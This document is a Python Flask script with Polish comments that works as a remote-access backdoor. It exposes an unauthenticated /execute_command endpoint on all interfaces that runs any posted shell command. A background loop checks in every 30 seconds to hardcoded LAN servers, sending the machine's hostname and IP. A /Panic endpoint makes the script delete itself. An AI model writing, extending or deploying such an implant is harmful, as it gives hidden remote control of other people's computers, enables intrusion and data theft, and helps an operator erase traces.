import os
import sys
import time
import socket
import requests
from datetime import datetime
import subprocess
from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import threading

ScriptVersion = 1.3

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('10.254.254.254', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def check_ip_reachability(ip_address, port):
    try:
        s = socket.create_connection((ip_address, port), timeout=2)
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError):
        return False

def validate_server():
    ip_addresses_to_check = ['192.168.0.162', '192.168.21.37'] # Adresy IP, Wprowadż adres pod którym będzie znajdował sięodpalony (server.js) 
    port_to_check = 3001

    for ip_address in ip_addresses_to_check:
        if check_ip_reachability(ip_address, port_to_check):
            print(f"\nAdres IP {ip_address} jest osiągalny na porcie {port_to_check}. UwU\n")
            return ip_address
        else:
            print(f"\nAdres IP {ip_address} nie jest osiągalny na porcie {port_to_check}. Meow\n")

def send_data_to_server(ip_address, pc_name, last_online, ScriptVersion):
    url = f'http://{ip_address}:3001/ip'
    data_to_send = {'IP': get_ip(), 'HostName': pc_name, 'LastOnline': str(last_online), 'ScriptVersion': ScriptVersion}
    response = requests.post(url, json=data_to_send)
    print(response.text)



def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except subprocess.CalledProcessError as e:
        return e.output

def execute_command_thread(command):
    threading.Thread(target=execute_command, args=(command,)).start()

def background_task():
    while True:
        pc_name = os.environ['COMPUTERNAME']
        now = datetime.now()
        last_online = now.strftime("%d/%m/%Y %H:%M:%S")

        validated_ip = validate_server()

        if validated_ip:
            send_data_to_server(validated_ip, pc_name, last_online, ScriptVersion)
            print(ScriptVersion)

        time.sleep(30)


@app.route('/Panic', methods=['POST'])
def Panic():
    subprocess.Popen("python -c \"import os, time; time.sleep(1); os.remove('{}');\"".format(sys.argv[0]))
    sys.exit(0)

@app.route('/execute_command', methods=['POST'])
def execute_command_route():
    try:
        command = request.json['command']
        result = execute_command(command)
        return jsonify({'status': 'success', 'result': result})
    except Exception as e:
        return jsonify({'status': 'error', 'error': str(e)}), 500

if __name__ == '__main__':
    threading.Thread(target=background_task).start()
    app.run(host='0.0.0.0', port=2137)
